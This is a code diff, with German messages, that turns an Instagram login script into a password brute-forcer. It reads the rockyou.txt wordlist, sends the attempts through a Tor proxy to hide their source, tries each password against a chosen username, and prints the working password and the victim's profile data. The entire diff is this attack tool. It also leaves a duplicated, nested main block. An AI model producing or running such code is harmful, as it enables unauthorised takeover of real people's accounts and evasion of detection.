@@ -78,12 +78,29 @@ if __name__ == "__main__":
     username = input("Instagram Username: ")
     password = input("Instagram Password: ")
 
-    sess = instagram_login(username, password)
-    if sess:
-        print("Profilinformationen abrufen für:", username)
-        profile = get_instagram_profile(username)
-        if profile:
-            for k, v in profile.items():
-                print(f"{k}: {v}")
-    else:
-        print("Konnte kein Profil ohne Login abrufen oder Login fehlgeschlagen.")
+    if __name__ == "__main__":
+        username = input("Instagram Username: ")
+        password_file = "rockyou.txt"  # oder Pfad zu Deiner Wortliste
+
+        passwords = load_passwords(password_file)
+
+        if not passwords:
+            print("Keine Passwörter zum Testen geladen. Beende.")
+            exit(1)
+
+        with TorProxy() as proxy:
+            session = proxy.session
+            if not session:
+                print("Konnte keine Proxy-Session erzeugen. Exit.")
+                exit(1)
+
+            for pw in passwords:
+                print(f"Teste Passwort: {pw}")
+                sess = instagram_login(session, username, pw)
+                if sess:
+                    print(f"Erfolgreiches Login! Passwort: {pw}")
+                    profile = get_instagram_profile(sess, username)
+                    if profile:
+                        for k, v in profile.items():
+                            print(f"{k}: {v}")
+                    break
